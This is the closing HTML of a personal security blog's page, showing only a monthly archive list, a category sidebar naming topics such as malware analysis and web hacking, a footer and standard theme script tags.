					<li><a href='https://maxkersten.nl/2024/11/'>November 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/10/'>October 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/09/'>September 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/08/'>August 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/06/'>June 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/05/'>May 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/04/'>April 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/03/'>March 2024</a></li>
	<li><a href='https://maxkersten.nl/2024/02/'>February 2024</a></li>
	<li><a href='https://maxkersten.nl/2023/08/'>August 2023</a></li>
	<li><a href='https://maxkersten.nl/2023/05/'>May 2023</a></li>
	<li><a href='https://maxkersten.nl/2023/04/'>April 2023</a></li>
	<li><a href='https://maxkersten.nl/2023/03/'>March 2023</a></li>
	<li><a href='https://maxkersten.nl/2023/02/'>February 2023</a></li>
	<li><a href='https://maxkersten.nl/2023/01/'>January 2023</a></li>
	<li><a href='https://maxkersten.nl/2022/12/'>December 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/11/'>November 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/10/'>October 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/09/'>September 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/08/'>August 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/07/'>July 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/06/'>June 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/05/'>May 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/04/'>April 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/03/'>March 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/02/'>February 2022</a></li>
	<li><a href='https://maxkersten.nl/2022/01/'>January 2022</a></li>
	<li><a href='https://maxkersten.nl/2021/12/'>December 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/11/'>November 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/10/'>October 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/09/'>September 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/08/'>August 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/07/'>July 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/06/'>June 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/05/'>May 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/04/'>April 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/03/'>March 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/02/'>February 2021</a></li>
	<li><a href='https://maxkersten.nl/2021/01/'>January 2021</a></li>
	<li><a href='https://maxkersten.nl/2020/12/'>December 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/11/'>November 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/10/'>October 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/09/'>September 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/08/'>August 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/07/'>July 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/06/'>June 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/05/'>May 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/04/'>April 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/03/'>March 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/02/'>February 2020</a></li>
	<li><a href='https://maxkersten.nl/2020/01/'>January 2020</a></li>
	<li><a href='https://maxkersten.nl/2019/12/'>December 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/11/'>November 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/10/'>October 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/09/'>September 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/08/'>August 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/07/'>July 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/06/'>June 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/05/'>May 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/04/'>April 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/03/'>March 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/02/'>February 2019</a></li>
	<li><a href='https://maxkersten.nl/2019/01/'>January 2019</a></li>
	<li><a href='https://maxkersten.nl/2018/12/'>December 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/11/'>November 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/10/'>October 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/09/'>September 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/08/'>August 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/07/'>July 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/06/'>June 2018</a></li>
	<li><a href='https://maxkersten.nl/2018/01/'>January 2018</a></li>
	<li><a href='https://maxkersten.nl/2017/10/'>October 2017</a></li>
	<li><a href='https://maxkersten.nl/2017/07/'>July 2017</a></li>
	<li><a href='https://maxkersten.nl/2017/06/'>June 2017</a></li>
	<li><a href='https://maxkersten.nl/2017/05/'>May 2017</a></li>
	<li><a href='https://maxkersten.nl/2017/04/'>April 2017</a></li>
			</ul>

			</aside><aside id="categories-2" class="widget inner-padding widget_categories"><h4 class="widget-title">Categories</h4>
			<ul>
					<li class="cat-item cat-item-10"><a href="https://maxkersten.nl/category/androidprojectcreator/">AndroidProjectCreator</a>
</li>
	<li class="cat-item cat-item-16"><a href="https://maxkersten.nl/category/api-clients/">API Clients</a>
</li>
	<li class="cat-item cat-item-9"><a href="https://maxkersten.nl/category/binary-analysis-course/">Binary Analysis Course</a>
</li>
	<li class="cat-item cat-item-4"><a href="https://maxkersten.nl/category/capricorn/">Capricorn</a>
</li>
	<li class="cat-item cat-item-18"><a href="https://maxkersten.nl/category/conferences/">Conferences</a>
</li>
	<li class="cat-item cat-item-3"><a href="https://maxkersten.nl/category/ethics/">Ethics</a>
</li>
	<li class="cat-item cat-item-2"><a href="https://maxkersten.nl/category/gemini/">Gemini</a>
</li>
	<li class="cat-item cat-item-6"><a href="https://maxkersten.nl/category/lectures/">Lectures</a>
</li>
	<li class="cat-item cat-item-19"><a href="https://maxkersten.nl/category/libras-ghidra-library/">Libra&#039;s Ghidra Library</a>
</li>
	<li class="cat-item cat-item-17"><a href="https://maxkersten.nl/category/m3/">m3</a>
</li>
	<li class="cat-item cat-item-15"><a href="https://maxkersten.nl/category/magecart/">MageCart</a>
</li>
	<li class="cat-item cat-item-13"><a href="https://maxkersten.nl/category/malpull/">MalPull</a>
</li>
	<li class="cat-item cat-item-8"><a href="https://maxkersten.nl/category/malware-analysis/">Malware Analysis</a>
</li>
	<li class="cat-item cat-item-14"><a href="https://maxkersten.nl/category/malwaretheflag/">MalwareTheFlag</a>
</li>
	<li class="cat-item cat-item-11"><a href="https://maxkersten.nl/category/responsible-disclosure/">Responsible Disclosure</a>
</li>
	<li class="cat-item cat-item-12"><a href="https://maxkersten.nl/category/reviews/">Reviews</a>
</li>
	<li class="cat-item cat-item-1"><a href="https://maxkersten.nl/category/uncategorized/">Uncategorized</a>
</li>
	<li class="cat-item cat-item-5"><a href="https://maxkersten.nl/category/web-hacking/">Web hacking</a>
</li>
	<li class="cat-item cat-item-7"><a href="https://maxkersten.nl/category/whitepapers/">Whitepapers</a>
</li>
			</ul>

			</aside>			</div><!-- .inside-right-sidebar -->
</div><!-- #secondary -->
	</div><!-- #content -->
</div><!-- #page -->
<div class="site-footer  ">
		<footer class="site-info" itemtype="http://schema.org/WPFooter" itemscope="itemscope">
		<div class="inside-site-info grid-container grid-parent">
						<div class="copyright-bar">
				<span class="copyright">&copy; 2024</span> &bull; <a href="https://generatepress.com" target="_blank" itemprop="url">GeneratePress</a>			</div>
		</div>
	</footer><!-- .site-info -->
	</div><!-- .site-footer -->

<a title="Scroll back to top" rel="nofollow" href="#" class="generate-back-to-top" style="opacity:0;visibility:hidden;" data-scroll-speed="400" data-start-scroll="300">
			<i class="fa fa-angle-up" aria-hidden="true"></i>
			<span class="screen-reader-text">Scroll back to top</span>
		</a><script type="text/javascript" src="https://maxkersten.nl/wp-content/themes/generatepress/js/navigation.min.js?ver=1.3.46" id="generate-navigation-js"></script>
<script type="text/javascript" src="https://maxkersten.nl/wp-content/themes/generatepress/js/dropdown.min.js?ver=1.3.46" id="generate-dropdown-js"></script>
<script type="text/javascript" src="https://maxkersten.nl/wp-content/themes/generatepress/js/back-to-top.min.js?ver=1.3.46" id="generate-back-to-top-js"></script>
<!--[if lt IE 9]>
<script type="text/javascript" src="https://maxkersten.nl/wp-content/themes/generatepress/js/html5shiv.min.js?ver=1.3.46" id="generate-html5-js"></script>
<![endif]-->

</body>
</html>